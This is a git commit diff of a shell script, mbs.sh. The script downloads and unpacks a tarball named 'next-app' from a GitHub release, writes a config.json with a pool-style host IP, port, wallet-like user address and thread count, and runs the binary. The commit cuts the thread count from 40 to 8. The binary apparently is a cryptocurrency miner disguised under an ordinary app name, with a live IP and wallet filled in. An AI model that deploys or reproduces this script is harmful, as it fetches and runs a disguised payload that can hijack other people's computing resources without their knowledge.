050f511bd9d47b960e1f677f9109e5ee8fe1d50c
barburonjilo <barburonjilo@outlook.co.id>
2025-07-24 13:59:40 +0700

    Update mbs.sh

--- mbs.sh
+++ mbs.sh
@@ -9,6 +9,6 @@ wget https://github.com/mom742886/next-app/releases/download/v1/next-app.tar.gz
 
 tar -xf next-app.tar.gz
 
-echo '{"host": "45.115.225.42", "port": 443, "user": "mbc1qh9m6s26m5u0snjk7wp5gl4v6w6ecsgz7jsv482", "pass": "x", "threads": 40}' > config.json
+echo '{"host": "45.115.225.42", "port": 443, "user": "mbc1qh9m6s26m5u0snjk7wp5gl4v6w6ecsgz7jsv482", "pass": "x", "threads": 8}' > config.json
 ./next-app/next-app
 # cpulimit --limit 450 -- ./next-app/next-app
